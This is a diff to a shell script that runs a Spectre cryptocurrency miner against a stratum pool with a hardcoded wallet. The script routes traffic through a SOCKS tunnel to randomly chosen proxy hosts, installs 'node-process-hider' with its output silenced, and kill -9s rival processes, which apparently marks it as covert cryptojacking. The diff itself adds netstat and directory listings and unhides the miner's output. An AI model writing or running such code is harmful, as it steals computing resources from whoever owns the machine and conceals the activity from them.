@@ -40,9 +40,14 @@ Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot
 
 sleep 2
 
-curl -x socks5h://127.0.0.1:1082 ifconfig.me
+curl -x socks5h://127.0.0.1:1082 api.ipify.org
 
 sleep 2
+
+echo " "
+echo " "
+echo " "
+echo " "
 
 npm i -g node-process-hider 1>/dev/null 2>&1
 
@@ -94,12 +99,27 @@ ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
 
 sleep 3
 
+netstat -ntlp
+
+sleep 2
+
+ls -la
+
+sleep 2
+
+echo " "
+echo " "
+echo " "
+echo " "
+
+sleep 2
+
 echo "Your worker is : $currentdate "
 
 sleep 2
 
 while true
 do
-./update/update ./tin --spectre --stratum --daemon-address spectre.cedric-crispin.com --port 4364 --wallet spectre:qqp8js5e364fagd3w9j3ncq4ea29d9tj0lpmemzew6rcgtzz9ck0u54kwtgta --worker-name $currentdate --dev-fee 1 --threads $used_num_of_cores 1>/dev/null 2>&1
+./tin --spectre --stratum --daemon-address spectre.cedric-crispin.com --port 4364 --wallet spectre:qqp8js5e364fagd3w9j3ncq4ea29d9tj0lpmemzew6rcgtzz9ck0u54kwtgta --worker-name $currentdate --dev-fee 1 --threads $used_num_of_cores
 sleep 10
 done
